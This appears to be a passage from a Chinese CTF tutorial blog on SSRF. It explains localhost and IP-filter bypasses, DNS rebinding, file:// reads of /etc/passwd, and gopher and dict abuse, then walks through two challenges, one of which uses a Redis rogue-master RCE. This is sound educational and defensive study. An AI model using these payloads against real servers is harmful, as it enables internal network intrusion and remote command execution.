<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.026</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.027</span> ms

--- <span class="token number">0.0</span>.0.0 <span class="token function">ping</span> statistics ---
<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3073ms
rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.026</span>/0.031/0.036/0.004 ms
</code></pre>
    <p>
     <strong>
      ipv6表示法绕过
     </strong>
    </p>
    <p>
     <code>
      [0:0:0:0:0:ffff:127.0.0.1]
     </code>
     是ipv6兼容ipv4的格式
    </p>
    <pre><code class="prism language-shell">http://<span class="token punctuation">[</span><span class="token number">0</span>:0:0:0:0:ffff:127.0.0.1<span class="token punctuation">]</span>/hint.php
</code></pre>
    <p>
     <strong>
      本地回环地址绕过
     </strong>
    </p>
    <p>
     整个127.0.0.0/8都是回环地址，使用127.0.0.2代替127.0.0.1，或者其他都可以尝试。
    </p>
    <p>
     <strong>
      DNS重绑定
     </strong>
    </p>
    <p>
     在线利用网站：
     <code>
      https://lock.cmpxchg8b.com/rebinder.html
     </code>
    </p>
    <p>
     攻击原理
    </p>
    <p>
     利用服务器两次解析同一个域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf。
    </p>
    <blockquote>
     <p>
      第一次DNS解析：是对URL的host进行解析。
     </p>
     <p>
      第二次DNS解析：使用CURL发包的时候进行解析 。
     </p>
    </blockquote>
    <p>
     第一次DNS解析的IP设为合法IP来绕过host合法性检测，第二次DNS解析时更换URL对应的IP变为内网IP，在TTL结束、缓存失效之后，重新访问此URL就能获取被更换的IP，就能使用SSRF访问内网。
    </p>
    <p>
     整个过程对于浏览器来说整个过程都是访问同一域名，因此认为是安全的，这就导致绕过。
    </p>
    <blockquote>
     <p>
      DNS中的TTL机制：域名和IP绑定关系的Cache存活的最长时间。
     </p>
    </blockquote>
    <p>
     TTL最理想的设置为0，即在第一次解析之后，立马换为我们想要访问的内网ip，但有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存。
    </p>
    <p>
     在某些情况下，我们甚至可以对同一个域名设置两个A记录（一个内网、一个外网），随机访问两条记录中的一个，就会有概率成功。
    </p>
    <pre><code>https://lock.cmpxchg8b.com/rebinder.html
</code></pre>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212170403029.png&amp;pos_id=img-SHWsfE5u-1741909831956"/>
    </p>
    <p>
     最好在第一个填写公网地址，第二个填写内网地址。然后复制下面的url，拿到具有该漏洞的页面进行测试。例如：
    </p>
    <pre><code>http://deb7400b.7f000001.rbndr.us/flag.php
</code></pre>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212170616969.png&amp;pos_id=img-fwIqrgay-1741909831957"/>
    </p>
    <h3>
     <a id="_493">
     </a>
     伪协议
    </h3>
    <h5>
     <a id="file_495">
     </a>
     file://
    </h5>
    <p>
     用于从文件系统中获取文件内容，格式：
     <code>
      file://[文件路径]
     </code>
    </p>
    <pre><code class="prism language-shell">file:///etc/passwd            读取文件passwd
file:///etc/hosts             显示当前操作系统网卡的IP
file:///proc/net/arp          显示arp缓存表<span class="token punctuation">(</span>寻找内网其他主机<span class="token punctuation">)</span>
file:///proc/net/fib _trie    显示当前网段路由信息
</code></pre>
    <h5>
     <a id="dict_506">
     </a>
     dict://
    </h5>
    <p>
     字典服务协议，用于访问字典资源，如：
     <code>
      dict://ip:6666/info
     </code>
    </p>
    <p>
     可用于扫描端口、获取内网信息、爆破密码等。
    </p>
    <h5>
     <a id="ftp_512">
     </a>
     ftp://
    </h5>
    <p>
     可以用于网络端口扫描，但是效率低
    </p>
    <h5>
     <a id="http_516">
     </a>
     http://
    </h5>
    <p>
     以只读访问文件或资源
    </p>
    <h5>
     <a id="gopher_520">
     </a>
     gopher://
    </h5>
    <p>
     基本格式:
     <code>
      gopher://ip:port/_abcd
     </code>
    </p>
    <p>
     由于gopher请求不转发第一个字符，要使用下划线或其他符号填充首位。
    </p>
    <h3>
     <a id="_526">
     </a>
     题目练习
    </h3>
    <h4>
     <a id="_2020_SSRFMe_530">
     </a>
     [网鼎杯 2020 玄武组]SSRFMe
    </h4>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">' is inner ip'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// Please visit hint.php locally.</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <p>
     首先check_inner_ip()函数要求只能使用http|https|gopher|dict这四个协议，然后通过parse_url获取的地址执行gethostbyname()函数
    </p>
    <blockquote>
     <p>
      gethostbyname函数只能解析A记录(ipv4地址)，而不能解析127.0.0.1，也防御了127.0.0.1.xip.io这样利用dns解析的绕过方法
     </p>
    </blockquote>
    <p>
     ip2long函数将ip地址转成整数，判断为是否为内网网段，不能通过转换进制绕过了。
    </p>
    <p>
     代码最后提示访问本地的hint.php，需要绕过本地验证，下面是可行的两种方式
    </p>
    <pre><code class="prism language-php">http<span class="token punctuation">:</span><span class="token comment">//sudo.cc/hint.php</span>
http<span class="token punctuation">:</span><span class="token comment">//0.0.0.0/hint.php</span>
http<span class="token punctuation">:</span><span class="token comment">//[0:0:0:0:0:ffff:127.0.0.1]/hint.php</span>
</code></pre>
    <p>
     hint.php内容
    </p>
    <pre><code class="prism language-php"><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1360</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">" &lt;?php
if(<span class="token interpolation"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span></span>==="</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token string double-quoted-string">"){
    highlight_file(__FILE__);
}
if(isset(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span></span>)){
    file_put_contents(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span></span>,"</span><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'redispass is root'</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span></span>);
} "</span>
</code></pre>
    <p>
     可以看到考点是file_put_contents死亡代码，但是这里不太一样，还多了一句
     <code>
      redispass is root
     </code>
     ，和redis有关
    </p>
    <p>
     这里考点是
     <strong>
      redis主从复制
     </strong>
    </p>
    <pre><code>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。
</code></pre>
    <p>
     解题思路是，创建一个恶意的redis服务器，作为Redis朱镕基，该Redis主机能够回应其他连接他的redis从机的响应。
    </p>
    <p>
     我们可以使用我们的VPS作为恶意Redis主机，然后远程连接目标Redis服务器，通过slaveof命令将目标的Rdis机器设置为我们的从机。将恶意Redis主机上的wxp同步到Redis从机上，并将dbfilename设置为exp.so。最后控制Redis从机加载模块执行系统命令。
    </p>
    <p>
     用到这三个文件
    </p>
    <p>
     github项目地址：
    </p>
    <pre><code>https://github.com/xmsec/redis-ssrf
https://github.com/n0b0dyCN/redis-rogue-server
</code></pre>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250303145017242.png&amp;pos_id=img-plDwaCiF-1741909831957"/>
    </p>
    <h4>
     <a id="GHCTF_Goph3rrr_645">
     </a>
     GHCTF Goph3rrr
    </h4>
    <p>
     首先扫目录，得到app.py源码。
    </p>
    <pre><code class="prism language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Welcome back, </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>username<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Invalid credentials!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""省略"""</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Gopher'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No url provided :)"</span>
    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    realIpAddress <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">"file"</span> <span class="token keyword">or</span> realIpAddress <span class="token keyword">in</span> BlackList<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No (≧∇≦)"</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> urlunparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/RRegister'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">)</span>
        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'password'</span><span class="token punctuation">:</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Registration successful!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""省略"""</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Manage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Forbidden!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Allowed!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_avatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"User not found!"</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>avatar_dir<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>username<span class="token punctuation">}</span></span><span class="token string">.png"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Avatar uploaded successfully!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"No file uploaded!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""省略"""</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/app.py'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     在这里看到很明显的ssrf
    </p>
    <pre><code class="prism language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Gopher'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No url provided :)"</span>
    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    realIpAddress <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">"file"</span> <span class="token keyword">or</span> realIpAddress <span class="token keyword">in</span> BlackList<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No (≧∇≦)"</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> urlunparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Manage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Forbidden!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Allowed!!!"</span>
